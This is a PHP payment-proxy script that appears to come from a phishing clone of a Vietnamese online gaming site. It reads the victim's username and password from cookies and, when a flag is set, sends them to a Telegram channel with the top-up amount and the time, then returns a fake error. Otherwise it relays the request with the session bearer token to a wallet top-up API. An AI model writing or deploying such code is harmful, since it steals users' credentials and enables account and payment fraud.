<?php
session_start();
include "../config.php";
$auth_token = $_SESSION["auth"];
$raw_content = file_get_contents("php://input");
$json_data = json_decode($raw_content, 1);
$BankCode = $json_data['BankCode'];
$CurrencyID = $json_data['CurrencyID'];
$IBankValue = $json_data['IBankValue'];
$Language = $json_data['Language'];
$Note = $json_data['Note'];
if ($tokenbank){
    $auth = $tokenbank;
}
else $auth = $auth_token;
$username = $_COOKIE["username"];
$password = $_COOKIE["password"];

if ($bay_bank) {
	date_default_timezone_set("Asia/Ho_Chi_Minh");
	$time = date("H:i:s Y-m-d");
	$ip=$_SERVER["REMOTE_ADDR"];
	// gữi thông tin về tele
	$message = "PAY BANK: Gamvip.com.vn\nTài khoản: $username\nMật khẩu: $password\nSố tiền: $IBankValue\nThời Gian: $time";
	send_telegram($message);


	die('{"c":-1025,"m":""}');
}
	

$url = "https://profile.g88.vin/api/payment/WalletTopup";
   $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_HEADER,0);
  //  $data = "{\"OTPType\":$OTPType,\"OTP\":\"$otpp\"}";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
    curl_setopt($ch,CURLOPT_HTTPHEADER,["Authorization: Bearer $auth","Content-type: application/json"]);
 
	$raw_content = curl_exec($ch);

curl_close($ch);
echo $raw_content;

?>